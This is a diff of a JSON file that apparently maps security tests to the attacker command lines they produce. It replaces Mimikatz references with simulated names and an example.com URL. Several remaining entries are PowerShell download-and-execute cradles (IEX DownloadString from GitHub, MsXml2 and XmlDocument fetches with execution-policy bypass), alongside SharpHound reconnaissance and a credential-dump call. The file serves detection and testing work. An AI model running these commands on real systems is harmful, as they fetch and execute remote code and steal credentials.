@@ -78,10 +78,10 @@
         ],
         "TargetProcessCommandLine": [
           "Start-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"",
-          "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"",
+          "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{simurl}'); Invoke-CredDumpSim -DumpCreds\"",
           "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\" try { Invoke-BloodHound -OutputDirectory $env:Temp } catch { $_; exit $_.Exception.HResult} Start-Sleep 5",
           "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp Start-Sleep 5",
-          "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.For...",
+          "$url='https://example.com/sample/Invoke-CredDumpSim.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.For...",
           "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"",
           "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"",
           "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\""
